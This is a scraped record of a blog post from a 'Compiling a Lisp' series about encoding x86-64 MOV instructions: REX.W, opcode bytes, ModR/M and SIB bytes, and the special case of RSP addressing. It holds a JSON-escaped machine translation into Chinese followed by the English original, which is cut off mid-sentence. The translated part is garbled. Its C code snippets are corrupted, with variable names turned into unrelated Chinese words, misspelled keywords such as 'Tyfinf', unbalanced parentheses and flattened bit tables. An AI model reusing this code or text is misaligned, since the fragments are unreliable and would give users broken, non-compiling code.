\u548cSIB\u5b57\u8282\u7ec4\u5408\u5728\u4e00\u8d77\u65f6\uff0c\u8fd9\u4e9b\u8868\u975e\u5e38\u6709\u7528\u3002\n\u7ed9\u5b9a\u4e00\u4e2a\u5bc4\u5b58\u5668dst\u548c\u4e00\u4e2a\u7acb\u5373\u768432\u4f4d\u6574\u6570src\uff0c\u6211\u4eec\u5c06\u5bf9\u6b64\u6307\u4ee4\u8fdb\u884c\u7f16\u7801\u3002\u8ba9\u6211\u4eec\u6309\u987a\u5e8f\u505a\u6240\u6709\u7684\u6b65\u9aa4\u3002\n\u7531\u4e8e\u6307\u4ee4\u8c03\u7528REX.W\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u4fdd\u6301\u7b2c\u4e00\u884c\u4e0e\u524d\u9762\u76f8\u540c\uff1a\nModR/M\u5b57\u8282\u662f\u4ee3\u7801\u7a0d\u6709\u4e0d\u540c\u7684\u5730\u65b9\u3002\u6211\u4eec\u60f3\u8981\u4e00\u4e2a\u62bd\u8c61\u6765\u4e3a\u6211\u4eec\u6784\u5efa\u5b83\u4eec\uff0c\u800c\u4e0d\u662f\u50cf\u67d0\u79cd\u52a8\u7269\u4e00\u6837\u624b\u52a8\u629b\u51fa\u6574\u6570\u3002\n\u8981\u505a\u5230\u8fd9\u4e00\u70b9\uff0c\u6211\u4eec\u5e94\u8be5\u77e5\u9053\u5b83\u4eec\u662f\u5982\u4f55\u7ec4\u5408\u5728\u4e00\u8d77\u7684\u3002ModR/M\u5b57\u8282\u5305\u62ec\uff1a\nMOD(\u9ad82\u4f4d)\uff0c\u63cf\u8ff0\u8981\u5728ModR/M\u8868\u4e2d\u4f7f\u7528\u7684\u5927\u884c\u3002\nREG(\u4e2d\u95f43\u4f4d)\uff0c\u63cf\u8ff0\u7b2c\u4e8c\u4e2a\u5bc4\u5b58\u5668\u64cd\u4f5c\u6570\u6216\u64cd\u4f5c\u7801\u6269\u5c55(\u5982\u4e0a\u9762\u7684/0)\u3002\nByte modrm(byte mod\uff0cbyte rm\uff0cbyte reg){return(mod&amp\uff1b0x3)&lt\uff1b&lt\uff1b6)|((reg&amp\uff1b0x7)&lt\uff1b&lt\uff1b3)|(rm&amp\uff1b0x7)\uff1b}\u3002\n\u53c2\u6570\u7684\u987a\u5e8f\u4e0e\u4f4d\u7684\u987a\u5e8f\u7565\u6709\u4e0d\u540c\u3002\u6211\u8fd9\u6837\u505a\u662f\u56e0\u4e3a\u5728\u8c03\u7528\u51fd\u6570\u65f6\u4f1a\u4f7f\u8c03\u7528\u8005\u770b\u8d77\u6765\u66f4\u81ea\u7136\u4e00\u4e9b\u3002\u56e0\u4e3a\u592a\u6df7\u4e71\u4e86\uff0c\u6211\u4ee5\u540e\u518d\u6362\u5427\u3002\n\u5c060b11(3)\u4f5c\u4e3amod\u4f20\u9012\uff0c\u56e0\u4e3a\u6211\u4eec\u5e0c\u671b\u76f4\u63a5\u79fb\u516564\u4f4d\u5bc4\u5b58\u5668\uff0c\u800c\u4e0d\u662f[reg]\uff0c\u8fd9\u610f\u5473\u7740\u6211\u4eec\u5e0c\u671b\u53d6\u6d88\u5f15\u7528\u6307\u9488\u4e2d\u7684\u503c\u3002\nVoid emit_mov_reg_imm32(buffer*buf\uff0cRegister dst\uff0cint32_t src){buffer_write8(buf\uff0ckRexPrefix)\uff1bbuffer_write8(buf\uff0c0xc7)\uff1bbuffer_write8(buf\uff0cmodrm(/*direct*/3\uff0cdst\uff0c0))\uff1b//...}\n\u5bf9\u4e8e\u4e0a\u9762\u7684\u6307\u4ee4mov rax\uff0c100\uff0c\u5176\u4ea7\u751f\u4e0e\u6b64\u5e03\u5c40\u76f8\u540c\u7684modrm\u5b57\u8282\uff1a\nModR/M mod reg RM 11 000 direct/0 Rax 000\u6211\u6ca1\u6709\u628amods\u7684\u6570\u636e\u7c7b\u578b\u653e\u5728\u4e00\u8d77\uff0c\u56e0\u4e3a\u6211\u4e0d\u77e5\u9053\u6211\u662f\u5426\u80fd\u591f\u5f88\u597d\u5730\u8868\u8fbe\u5b83\u3002\u6240\u4ee5\u73b0\u5728\u6211\u53ea\u662f\u6dfb\u52a0\u4e86\u4e00\u4e2a\u8bc4\u8bba\u3002\n\u6700\u540e\uff0c\u6211\u4eec\u6709\u5373\u671f\u4ef7\u503c\u3002\u6b63\u5982\u6211\u4e0a\u9762\u6240\u8bf4\u7684\uff0c\u6240\u6709\u8fd9\u4e00\u5207\u90fd\u9700\u8981\u5199\u51fa\u4e00\u4e2a32\u4f4d\u7684\u6570\u91cf\uff0c\u5c31\u50cf\u6211\u4eec\u4e00\u76f4\u505a\u7684\u90a3\u6837\uff1a\nVoid emit_mov_reg_imm32(buffer*buf\uff0cRegister dst\uff0cint32_t src){buffer_write8(buf\uff0ckRexPrefix)\uff1bbuffer_write8(buf\uff0c0xc7)\uff1bbuffer_write8(buf\uff0cmodrm(/*direct*/3\uff0cdst\uff0c0))\uff1bbuffer_write32(buf\uff0csrc)\uff1b}\u3002\n\u73b0\u5728\u4f60\u5c31\u77e5\u9053\u4e86\uff01\u6211\u4eec\u82b1\u4e862500\u4e2a\u5b57\u624d\u8bfb\u5230\u8fd9\u5fae\u4e0d\u8db3\u9053\u76844\u4e2a\u5b57\u8282\u3002\u771f\u6b63\u7684\u6210\u529f\u662f\u6211\u4eec\u4e00\u8def\u7ed3\u4ea4\u7684\u670b\u53cb\u3002\n\u201c\u4f46\u662fMax\uff0c\u201d\u4f60\u8bf4\uff0c\u201c\u8fd9\u4f1a\u4ea7\u751f\u548c\u4ee5\u524d\u6240\u6709\u60c5\u51b5\u4e0b\u4e00\u6837\u7684\u8f93\u51fa\uff01\u4e3a\u4ec0\u4e48\u8981\u8fd9\u4e48\u9ebb\u70e6\u5462\uff1f\u8fd9\u662f\u600e\u4e48\u56de\u4e8b\uff1f\u201c\u3002\n\u55ef\uff0c\u4eb2\u7231\u7684\u8bfb\u8005\uff0cMOD\u4e3a3(\u76f4\u63a5)\u610f\u5473\u7740\u5f53DST\u662fRSP\u65f6\u6ca1\u6709\u7279\u6b8a\u60c5\u51b5\u4e0b\u7684\u9003\u751f\u8231\u53e3\u3002\u8fd9\u4e0e\u5176\u4ed6MOD\u4e0d\u540c\uff0c\u5728\u5176\u4ed6MOD\u4e2d\uff0c\u8868\u4e2d\u7684RSP\u5e94\u8be5\u662f[--][--]\u3002\u8be5FunkySymbol\u8868\u793aModR/M\u5b57\u8282\u540e\u9762\u5fc5\u987b\u6709\u4e00\u4e2a\u6807\u5ea6-\u7d22\u5f15-\u57fa\u6570(SIB)\u5b57\u8282\u3002\u8fd9\u610f\u5473\u7740\u6b64\u6307\u4ee4\u7684\u603b\u4f53\u683c\u5f0f\u5e94\u4e3a\u4ee5\u4e0b\u5e03\u5c40\uff1a\nREX Op ModR/M 0 1 2 3 SIB 4 disp 5\u4f8b\u5982\uff0c\u5982\u679c\u60a8\u5c1d\u8bd5\u5bf9mov[RSP-8]\u3001rax\u8fdb\u884c\u7f16\u7801\uff0c\u5219\u503c\u5e94\u5982\u4e0b\u6240\u793a\uff1a\nREX Op ModR/M 0 1 2 3 0x48 0x89 0x44 SIB 4 disp 5 0x24 0xf8\u8fd9\u5c31\u662f\u50cfemit_store_reg_direct(mov[reg+disp]\uff0csrc)\u8fd9\u6837\u7684\u6307\u4ee4\u4e0e\u6211\u8bbe\u8ba1\u7684\u81ea\u5236\u7f16\u7801\u65b9\u6848\u51fa\u73b0\u4e25\u91cd\u9519\u8bef\u7684\u5730\u65b9\u3002\u5f53\u8be5\u6307\u4ee4\u4e2d\u7684DST\u4e3aRSP\u65f6\uff0c\u9884\u8ba1\u4e0b\u4e00\u4e2a\u5b57\u8282\u4e3aSIB\u3002\u800c\u5f53\u4f60\u8f93\u51fa\u5176\u4ed6\u6570\u636e\u65f6(\u6bd4\u65b9\u8bf4\uff0c\u7acb\u53738\u4f4d\u4f4d\u79fb)\uff0c\u4f60\u5c31\u4f1a\u5f97\u5230\u975e\u5e38\u65f6\u9ae6\u7684\u5bfb\u5740\u6a21\u5f0f\u3002\u8fd9\u5230\u5e95\u662f\u4ec0\u4e48\u73a9\u610f\u513f\uff1f\n\u8fd9\u662f\u5b9e\u9645\u7684\u53cd\u6c47\u7f16\u7a0b\u5e8f\u96c6\uff0c\u6211\u901a\u8fc7rasm2\u8fd0\u884c\u6211\u7684\u4e8c\u8fdb\u5236\u4ee3\u7801\u5f97\u5230\u7684\u3002\u6211\u4eec\u7684\u7f16\u8bd1\u5668\u7edd\u5bf9\u4e0d\u4f1a\u53d1\u51fa\u4efb\u4f55\u590d\u6742\u7684\u4e1c\u897f\uff0c\u8fd9\u5c31\u662f\u6211\u53d1\u73b0\u95ee\u9898\u7684\u539f\u56e0\u3002\n\u597d\u5427\uff0c\u6240\u4ee5\u8fd9\u662f\u9519\u7684\u3002\u6211\u4eec\u4e0d\u80fd\u53ea\u662f\u76f2\u76ee\u5730\u4e58\u6cd5\u548c\u52a0\u6cd5\u3002\u90a3\u4e48Dowe\u505a\u4e86\u4ec0\u4e48\uff1f\n\u518d\u770b\u4e00\u4e0b\u88682-2(\u7b2c532\u9875)\u3002\u8bf7\u6ce8\u610f\uff0c\u5c1d\u8bd5\u5c06RSP\u4e0e\u4efb\u4f55\u7c7b\u578b\u7684\u4f4d\u79fb\u4e00\u8d77\u4f7f\u7528\u90fd\u9700\u8981SIB\u3002\n\u73b0\u5728\u518d\u770b\u4e00\u4e0b\u88682-3(\u7b2c533\u9875)\u3002\u6211\u4eec\u8981\u7528\u8fd9\u4e2a\u628aSIB\u7ec4\u88c5\u8d77\u6765\u3002\n\u6211\u4eec\u4ece\u7b2c2.1.3\u8282\u4e86\u89e3\u5230\uff0c\u4e0eModR/M\u4e00\u6837\uff0cSIB\u7531\u4e09\u4e2a\u5b57\u6bb5\u7ec4\u6210\uff1a\n\u82f1\u7279\u5c14\u7684\u8bed\u8a00\u4e0d\u662f\u5f88\u6e05\u695a\uff0c\u6709\u70b9\u5faa\u73af\u3002\u8ba9\u6211\u4eec\u6765\u770b\u4e00\u4e0b\u793a\u4f8b\u8bf4\u660e\u6765\u6f84\u6e05\u4e00\u4e0b\uff1a\n\u8bf7\u6ce8\u610f\uff0cindex\u548cbase\u6307\u7684\u662f\u5bc4\u5b58\u5668\uff0cscale\u6307\u7684\u662f1\u30012\u30014\u62168\u4e2d\u7684\u4e00\u4e2a\uff0cdisp\u662f\u67d0\u4e2a\u7acb\u5373\u503c\u3002\n\u8fd9\u662f\u4e00\u79cd\u6307\u5b9a\u5185\u5b58\u504f\u79fb\u91cf\u7684\u7d27\u51d1\u65b9\u5f0f\u3002\u5b83\u4fbf\u4e8e\u8bfb\u53d6\u548c\u5199\u5165\u6570\u7ec4\u548c\u7ed3\u6784\u3002\u5982\u679c\u6211\u4eec\u60f3\u5199\u5165\u548c\u8bfb\u53d6\u5806\u6808\u6307\u9488rsp\u7684\u968f\u673a\u504f\u79fb\u91cf\uff0c\u90a3\u4e48\u5b83\u4e5f\u662f\u5fc5\u9700\u7684\u3002\n\u8ba9\u6211\u4eec\u5148\u56de\u5230\u5217\u4e3e\u6240\u6709\u7c7b\u578b\u7684MOV\u6307\u4ee4\u7684\u8868(\u7b2c1209\u9875)\u3002\u6211\u4eec\u8981\u67e5\u627e\u7684\u7279\u5b9a\u64cd\u4f5c\u7801\u662fREX.W+89/r\u6216MOV r/m64\uff0cr64\u3002\n\u5230\u73b0\u5728\u4e3a\u6b62\u8fd8\u597d\u3002\u770b\u8d77\u6765\u5f88\u773c\u719f\u3002\u73b0\u5728\u6211\u4eec\u6709\u4e86\u6307\u4ee4\u524d\u7f00\u548c\u64cd\u4f5c\u7801\uff0c\u662f\u65f6\u5019\u5199\u5165ModR/M\u5b57\u8282\u4e86\u3002\u6211\u4eec\u7684ModR/M\u5c06\u5305\u542b\u4ee5\u4e0b\u4fe1\u606f\uff1a\n\u56e0\u4e3a\u6211\u4eec\u6709\u4e24\u4e2a\u5bc4\u5b58\u5668\u64cd\u4f5c\u6570\uff0c\u6240\u4ee5\u7b2c\u4e8c\u4e2a\u64cd\u4f5c\u6570\u662f\u4efb\u4f55\u5bc4\u5b58\u5668\u7684REG(\u64cd\u4f5c\u7801\u5b57\u6bb5\u8bf4/r)\u3002\nVoid emit_store_reg_direct(buffer*buf\uff0cIndirect dst\uff0cRegister src){buffer_write8(buf\uff0ckRexPrefix)\uff1bbuffer_write8(buf\uff0c0x89)\uff1b//\u9519\u8bef\uff01Buffer_Write8(buf\uff0cmodrm(/*disp8*/1\uff0cdst.\u3002\u6ce8\u518c\u8868\uff0c\u6e90))\uff1b//...}\u3002\n\u4f46\u4e0d\uff0c\u8fd9\u662f\u4e0d\u5bf9\u7684\u3002\u7ed3\u679c\u662f\uff0c\u6b63\u5982\u6211\u4e0d\u65ad\u63d0\u5230\u7684\uff0c\u5f53dst.reg\u662fRSP\u65f6\uff0c\u60a8\u4ecd\u7136\u9700\u8981\u505a\u8fd9\u4e2a\u7279\u6b8a\u7684\u4e8b\u60c5\u3002\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0cRm\u5fc5\u987b\u662f\u7279\u6b8a\u7684None\u503c(\u7531\u8868\u6307\u5b9a)\u3002\u7136\u540e\u60a8\u8fd8\u5fc5\u987b\u5199\u5165ASIB\u5b57\u8282\u3002\nVoid emit_store_reg_direct(buffer*buf\uff0c\u95f4\u63a5DST\uff0c\u5bc4\u5b58\u5668\u6e90){buffer_write8(buf\uff0ckRexPrefix)\uff1bbuffer_write8(buf\uff0c0x89)\uff1bif(dst.\u3002Reg==krsp){buffer_write8(buf\uff0cmodrm(/*disp8*/1\uff0ckIndexNone\uff0csrc))\uff1b//...}\u5426\u5219{buffer_write8(buf\uff0cmodrm(/*disp8*/1\uff0cdst.\u3002\u6ce8\u518c\u8868\uff0c\u670d\u52a1\u5668))\uff1b}//...}\u3002\n\u7cbe\u660e\u7684\u8bfb\u8005\u4f1a\u77e5\u9053krsp\u548ckIndexNoone\u7684\u6574\u6570\u503c\u662f4\u3002\u6211\u4e0d\u77e5\u9053\u8fd9\u662f\u5426\u662f\u82f1\u7279\u5c14\u8bbe\u8ba1\u8005\u6545\u610f\u7684\u3002\u4e5f\u8bb8\u5b83\u5e94\u8be5\u662f\u8fd9\u6837\u7684\uff0c\u6240\u4ee5\u7f16\u7801\u66f4\u5bb9\u6613\uff0c\u5e76\u4e14\u4e0d\u9700\u8981\u5bf9ModR/M\u548cSIB\u90fd\u6709\u7279\u6b8a\u60c5\u51b5\u3002\u4e5f\u8bb8\u8fd9\u662f\u5076\u7136\u7684\u3002\u4e0d\u7ba1\u600e\u6837\uff0c\u6211\u53d1\u73b0\u5b83\u975e\u5e38\u5fae\u5999\uff0c\u6211\u60f3\u660e\u786e\u5730\u8bf4\u51fa\u6765\u3002\nModR/M mod reg rm 11 100 disp8 Rax NONE 000\u8ba9\u6211\u4eec\u7ee7\u7eed\u5199\u5165SIB\u5b57\u8282\u3002\u6211\u505a\u4e86\u4e00\u4e2a\u7c7b\u4f3cmodrm\u7684sib\u52a9\u624b\u51fd\u6570\uff0c\u53ea\u6709\u4e24\u4e2a\u5c0f\u7684\u4e0d\u540c\uff1a\u53c2\u6570\u662f\u4ece\u4f4e\u4f4d\u5230\u9ad8\u4f4d\u7684\u987a\u5e8f\uff0c\u53c2\u6570\u6709\u81ea\u5df1\u7684\u7279\u6b8a\u7c7b\u578b\uff0c\u800c\u4e0d\u53ea\u662f\u5b57\u8282\u3002\nTyfinf enum{Scale1=0\uff0cScale2\uff0cScale4\uff0cScale8\uff0c}scale\uff1btyfinf enum{kIndexRax=0\uff0ckIndexRcx\uff0ckIndexRdx\uff0ckIndexRbx\uff0ckIndexNone\uff0ckIndexRbp\uff0ckIndexRsi\uff0ckIndexRdi}Index\uff1bbyte sib(\u5bc4\u5b58\u5668\u57fa\u6570\uff0c\u7d22\u5f15\u7d22\u5f15\uff0c\u5c0f\u6570\u4f4d\u6570){return((scale&amp\uff1b0x3)&lt\uff1b&lt\uff1b6)|(index&amp\uff1b0x7)&lt\uff1b&lt\uff1b3)|(base&amp\uff1b0x7)\uff1b}\u3002\n\u6211\u521b\u5efa\u6240\u6709\u8fd9\u4e9b\u6570\u636e\u7c7b\u578b\u90fd\u662f\u4e3a\u4e86\u63d0\u9ad8\u53ef\u8bfb\u6027\uff0c\u4f46\u662f\u5982\u679c\u60a8\u4e0d\u60f3\u4f7f\u7528\u5b83\u4eec\uff0c\u4e5f\u53ef\u4ee5\u4e0d\u4f7f\u7528\u5b83\u4eec\u3002Index one\u662f\u552f\u4e00\u6709\u4e00\u4e2a\u5c0f\u95ee\u9898\u7684\uff1akIndexRsp\u5e94\u8be5\u5728\u54ea\u91cc\u662fkIndexNone\uff0c\u56e0\u4e3a\u60a8\u4e0d\u80fd\u5c06RSP\u7528\u4f5c\u7d22\u5f15\u5bc4\u5b58\u5668\u3002\nVoid emit_store_reg_direct(buffer*buf\uff0c\u95f4\u63a5DST\uff0c\u5bc4\u5b58\u5668\u6e90){buffer_write8(buf\uff0ckRexPrefix)\uff1bbuffer_write8(buf\uff0c0x89)\uff1bif(dst.\u3002Reg==krsp){buffer_write8(buf\uff0cmodrm(/*disp8*/1\uff0ckIndexNone\uff0csrc))\uff1bbuffer_write8(buf\uff0csib(krsp\uff0ckIndexNone\uff0cscale1))\uff1b}{buffer_write8(buf\uff0cmodrm(/*disp8*/1\uff0cdst.\u3002\u6ce8\u518c\u8868\uff0c\u670d\u52a1\u5668))\uff1b}//...}\u3002\nSIB\u89c4\u6a21\u7d22\u5f15\u57fa\u657000 100 0\u65e0RSP 100\u8fd9\u662f\u4e00\u79cd\u975e\u5e38\u5197\u957f\u7684\u8868\u793a[RSP+DISP]\u7684\u65b9\u5f0f\uff0c\u4f46\u5b83\u4e5f\u53ef\u4ee5\u3002\u73b0\u5728\u5269\u4e0b\u7684\u5c31\u662f\u7f16\u7801\u90a3\u4e2a\u4f4d\u79fb\u4e86\u3002\u8981\u505a\u5230\u8fd9\u4e00\u70b9\uff0c\u6211\u4eec\u53ea\u9700\u5c06\u5176\u5199\u51fa\u6765\uff1a\nVoid emit_store_reg_direct(buffer*buf\uff0c\u95f4\u63a5DST\uff0c\u5bc4\u5b58\u5668\u6e90){buffer_write8(buf\uff0ckRexPrefix)\uff1bbuffer_write8(buf\uff0c0x89)\uff1bif(dst.\u3002Reg==krsp){buffer_write8(buf\uff0cmodrm(/*disp8*/1\uff0ckIndexNone\uff0csrc))\uff1bbuffer_write8(buf\uff0csib(krsp\uff0ckIndexNone\uff0cscale1))\uff1b}{buffer_write8(buf\uff0cmodrm(/*disp8*/1\uff0cdst.\u3002Reg\uff0csrc))\uff1b}buffer_write8(buf\uff0cdisp8(\u95f4\u63a5\u3002Disp))\uff1b}\u3002\n\u975e\u5e38\u597d\u3002\u73b0\u5728\u8f6e\u5230\u60a8\u7740\u624b\u5728\u7f16\u8bd1\u5668\u4e2d\u8f6c\u6362\u5176\u4f59\u7684\u6c47\u7f16\u51fd\u6570\u4e86\uff01\u6211\u53d1\u73b0\u5c06modrm/sib/displ8\u8c03\u7528\u63d0\u53d6\u5230\u4e00\u4e2ahelper\u51fd\u6570\u4e2d\u975e\u5e38\u6709\u7528\uff0c\u56e0\u4e3a\u5b83\u4eec\u5927\u591a\u662f\u76f8\u540c\u7684\u5e76\u4e14\u975e\u5e38\u91cd\u590d\u3002\n\u8fd9\u662f\u4e00\u7bc7\u5f88\u957f\u7684\u5e16\u5b50\u3002\u8fd9\u662f\u5230\u76ee\u524d\u4e3a\u6b62\u6574\u4e2a\u7cfb\u5217\u4e2d\u6700\u957f\u7684\u5e16\u5b50\uff0c\u751a\u81f3\u662f\u3002\u6211\u4eec\u53ef\u80fd\u5e94\u8be5\u6709\u4e00\u4e9b\u5177\u4f53\u7684\u5916\u5356\u3002\n\u4e5f\u8bb8\u8fd8\u6709\u7b2c\u4e09\u4ef6\u4e8b\uff0c\u6211\u4e0d\u77e5\u9053-\u8fd9\u4e2a\u5e16\u5b50\u6709\u70b9\u591a\u3002\n\u5e0c\u671b\u4f60\u559c\u6b22\u3002\u6211\u8981\u53bb\u8bd5\u7740\u7761\u4e2a\u597d\u89c9\u3002\u76f4\u5230\u4e0b\u4e00\u6b21\uff0c\u6211\u4eec\u5c06\u5b9e\u73b0\u8fc7\u7a0b\u8c03\u7528\uff01\n\u8fd9\u662fPOST\u4e2d\u6240\u6709\u6307\u4ee4\u7f16\u7801\u56fe\u7684\u7ec4\u5408\u3002\u5982\u679c\u60a8\u518d\u6b21\u770b\u5230\u6b64\u6587\u672c\uff0c\u5219\u610f\u5473\u7740\u60a8\u7684\u6d4f\u89c8\u5668\u65e0\u6cd5\u5448\u73b0SVG\u3002\n\u5982\u679c\u4f60\u662f\u8fd9\u4e2a\u535a\u5ba2\u7684\u72c2\u70ed\u8bfb\u8005(\u8fd9\u4e9b\u4eba\u5b58\u5728\u5417\uff1f\u8bf7\u628a\u624b\u4f38\u5411\u6211\u3002\u6211\u5f88\u4e50\u610f\u804a\u5929\u3002)\uff0c\u4f60\u53ef\u80fd\u4f1a\u6ce8\u610f\u5230\u6c64\u59c6\u7ecf\u5e38\u88ab\u62c9\u8fdb\u6076\u4f5c\u5267\u7684\u5708\u5957\u3002\u8fd9\u662f\u56e0\u4e3aTom\u662f\u6211\u9047\u5230\u8fc7\u7684\u6700\u597d\u7684\u8c03\u8bd5\u5668\uff0c\u4ed6\u64c5\u957f\u53cd\u5411\u5de5\u7a0b\uff0c\u800c\u4e14\u4ed6\u77e5\u9053\u5f88\u591a\u4f4e\u7ea7\u7684\u4e8b\u60c5\u3002\u6211\u60f3\u73b0\u5728\u4ed6\u6b63\u81f4\u529b\u4e8e\u6539\u8fdbRISC-V\u677f\u7684\u5f00\u6e90\u5de5\u5177\uff0c\u4ee5\u6b64\u4e3a\u4e50\u3002\u4f46\u4ed6\u4e5f\u975e\u5e38\u5584\u826f\uff0c\u4e50\u4e8e\u52a9\u4eba\uff0c\u800c\u4e14\u901a\u5e38\u5bf9\u6211\u9677\u5165\u7684\u4efb\u4f55\u8352\u8c2c\u7684\u60c5\u51b5\u90fd\u611f\u5174\u8da3\u3002\u4e5f\u8bb8\u6211\u5e94\u8be5\u5728\u8fd9\u4e2a\u7f51\u7ad9\u7684\u67d0\u4e2a\u5730\u65b9\u52a0\u4e00\u4efd\u6c64\u59c6\u7f16\u5e74\u53f2\u7684\u540d\u5355\u3002\u4e0d\u7ba1\u600e\u4e48\u8bf4\uff0c\u6bcf\u4e2a\u4eba\u90fd\u9700\u8981\u4e00\u4e2aTOM\u3002--\u21a9", "note_en": "Welcome back to the Compiling a Lisp series. In this thrilling new update, wewill learn a little bit more about x86-64 instruction encoding instead ofallocating more interesting things on the heap or adding procedure calls.\n I am writing this interlude because I changed one register in my compiler code( kRbp to  kRsp) and all hell broke loose \u2014 the resulting program wascrashing,  rasm2/Cutter were decoding wacky instructions when fed my binary,etc. Over the span of two very interesting but very frustrating hours, Ilearned why I had these problems and how to resolve them. You should learn,too.\n   void  Emit_mov_reg_imm32 ( Buffer  * buf ,  Register  dst ,  int32_t  src )  {  Buffer_write8 ( buf ,  kRexPrefix );  Buffer_write8 ( buf ,  0xc7 );  Buffer_write8 ( buf ,  0xc0  +  dst );  Buffer_write32 ( buf ,  src ); }\n These functions all purport to encode x86-64 instructions. They do, most of thetime, but they do not tell the whole story. This function is supposed to encodean instruction of the form  mov reg64, imm32. How does it do it? I don\u2019t know!\n They have all these magic numbers in them! What is a  kRexPrefix? Well, it\u2019s 0x48. Does that mean anything to us? No! It gets worse. What are  0xc7 and 0xc0 doing there? Why are we adding  dst to  0xc0? Before this debuggingand reading extravaganza, I could not have told you. Remember how somewhere ina previous post I mentioned I was getting these hex bytes from reading thecompiled output on the Compiler Explorer? Yeah.\n As it turns out, this is not a robust development strategy, at least withx86-64. It might be okay for some more regular or predictable instruction sets,but not this one.\n  So where do we go from here? How do we find out how to take these mysticalhexes and incantations to something that better maps to the hardware? Well, weonce again drag  Tom  1 into a debugging session and pullout the big ol\u2019 Intel  Software Developer Manual.\n This is an enormous 26MB, 5000 page manual comprised of four volumes. It\u2019s very intimidating. This is exactly why I didn\u2019t want to pull it out earlierand do this properly from the beginning\u2026 but here we are, eventually needingto do it properly.\n I will not pretend to understand all of this manual, nor will this post be aguide to the manual. I will just explain what sections and diagrams I founduseful in understanding how this stuff works.\n I only ever opened Volume 2, the instruction set reference. In that honking2300 page volume are descriptions of every Intel x86-64 instruction and howthey are encoded. The instructions are listed alphabetically and split intosections based on the first letter of each instruction name.\n Let\u2019s take a look at Chapter 3, specifically at the MOV instruction on page\u00a0 1209. For those following along who do not want to download a massivePDF, this  website has a bunchof the same data in HTML form. Here\u2019s the  page forMOV.\n This page has every variant of MOV instruction. There are other instructionsbegin with MOV, like MOVAPD, MOVAPS, etc, but they are different enough thatthey are different instructions.\n  Opcode, which describes the layout of the bytes in the instruction stream.This describes how we\u2019ll encode instructions.\n  Instruction, which gives a text-assembly-esque representation of theinstruction. This is useful for figuring out which one we actually want toencode.\n  Op/En, which stands for \u201cOperand Encoding\u201d and as far as I can telldescribes the operand order with a symbol that is explained further in the\u201cInstruction Operand Encoding\u201d table on the following page.\n  64-Bit Mode, which tells you if the instruction can be used in 64-bit mode(\u201cValid\u201d) or not (something else, I guess).\n  Compat/Leg Mode, which tells you if the instruction can be used in someother mode, which I imagine is 32-bit mode or 16-bit mode. I don\u2019t know. Butit\u2019s not relevant for us.\n  Description, which provides a \u201cplain English\u201d description of the opcode,for some definition of the words \u201cplain\u201d and \u201cEnglish\u201d.\n Other instructions have slightly different table layouts, so you\u2019ll have towork out what the other columns mean.\n Here\u2019s a preview of some rows from the table, with HTML courtesy of FelixCloutier\u2019s aforementioned web docs:\n  If you take a look at the last entry in the table, you\u2019ll see  REX.W + C7 /0id. Does that look familiar? Maybe, if you squint a little?\n It turns out, that\u2019s the description for encoding the instruction we originallywanted, and had a bad encoder for. Let\u2019s try and figure out how to use this tomake our encoder better. In order to do that, we\u2019ll need to first understand ageneral layout for Intel instructions.\n    I found this information at the very beginning of Volume 2, Chapter 2 (page527) in a section called \u201cInstruction format for protected mode, real-addressmode, and virtual-8086 mode\u201d.\n You, like me, may be wondering about the difference between \u201coptional\u201d, \u201cifrequired\u201d, and \u201c\u2026, or none\u201d. I have no explanation, sorry.\n I\u2019m going to briefly explain each component here, followed up with apiece-by-piece dissection of the particular MOV instruction we want, so we getsome hands-on practice.\n  There are a couple kind of instruction prefixes, like REX (Section 2.2.1) andVEX (Section 2.3). We\u2019re going to focus on REX prefixes, since they are neededfor many (most?) x86-64 instructions, and we\u2019re not emitting vectorinstructions.\n The REX prefixes are used to indicate that an instruction, which might normallyrefer to a 32-bit register, should instead refer to a 64-bit register. Alsosome other things but we\u2019re mostly concerned with register sizes.\n  Take a look at Section 2.1.2 (page 529) for a brief explanation of opcodes. Thegist is that the opcode is the  meat of the instruction. It\u2019s what makes a MOVa MOV and not a HALT. The other fields all modify the meaning given by thisfield.\n  Take a look at Section 2.1.3 (page 529) for a brief explanation of ModR/M andSIB bytes. The gist is that they encode what register sources and destinationsto use.\n  Take a look at Section 2.1.4 (page 529) for a brief explanation of displacementand immediate bytes. The gist is that they encode literal numbers used in theinstructions that don\u2019t encode registers or anything.\n If you\u2019re confused, that\u2019s okay. It should maybe get clearer once we get ourhands dirty. Reading all of this information in a vacuum is moderately uselessif it\u2019s your first time dealing with assembly like this, but I included thissection first to help explain how to use the reference.\n  Got all that? Maybe? No? Yeah, me neither. But let\u2019s forge ahead anyway. Here\u2019sthe instruction we\u2019re going to encode:  REX.W + C7 /0 id.\n  First, let\u2019s figure out  REX.W. According to Section 2.2.1, which explains REXprefixes in some detail, there are a couple of different prefixes. There\u2019s ahelpful table (Table 2-4, page 535) documenting them. Here\u2019s a bit diagram withthe same information:\n                    0100  W  R  X  B  High bit  Low bit  REX  Bit 3 is the W prefix. If it\u2019s 1, it means the operands are 64 bits. If it\u2019s0, \u201coperand size [is] determined by CS.D\u201d. Not sure what that means.\n  Bits 2, 1, and 0 are other types of REX prefixes that we may not end upusing, so I am omitting them here. Please read further in the manual if youare curious!\n This MOV instruction calls for REX.W, which means this byte will look like 0b01001000, also known as our friend  0x48. Mystery number one, solved!\n  This is a hexadecimal literal  0xc7. It is the  opcode. There are a couple ofother entries with the opcode  C7, modified by other bytes in the instruction(ModR/M, SIB, REX, \u2026). Write it to the instruction stream. Mystery numbertwo, solved!\n   If the instruction does not require a second operand, then the Reg/Opcodefield may be used as an opcode extension. This use is represented by thesixth row in the tables (labeled \u201c/digit (Opcode)\u201d). Note that values in rowsix are represented in decimal form.\n This is a little confusing because this operation clearly  does have a secondoperand, denoted by the \u201cMI\u201d in the table, which shows Operand 1 being ModRM:r/m (w) and Operand 2 being  imm8/16/32/64. I think it\u2019s because itdoesn\u2019t have a second  register operand that this space is free \u2014 theimmediate is in a different place in the instruction.\n In any case, this means that we have to make sure to put decimal  0 in the reg part of the ModR/M byte. We\u2019ll see what the ModR/M byte looks like ingreater detail shortly.\n  id refers to an immediate  double word (32 bits). It\u2019s called a  doubleword because, a word ( iw) is 16 bits. In increasing order of size, we have:\n  This means we have to write our 32-bit value out to the instruction stream.These notations and encodings are explained further in Section 3.1.1.1 (page596).\n             REX  Op  ModR/M      Immediate    0  1      2  3  7       If we were to try and encode the particular instruction  mov rax, 100, itwould look like this:\n            REX  Op  ModR/M        Immediate    0  1      2  3  7      0x48  0xc7  0xc0  0x64 0x00 0x00 0x00 This is how you read the table! Slowly, piece by piece, and with a nice cup oftea to help you in trying times. Now that we\u2019ve read the table, 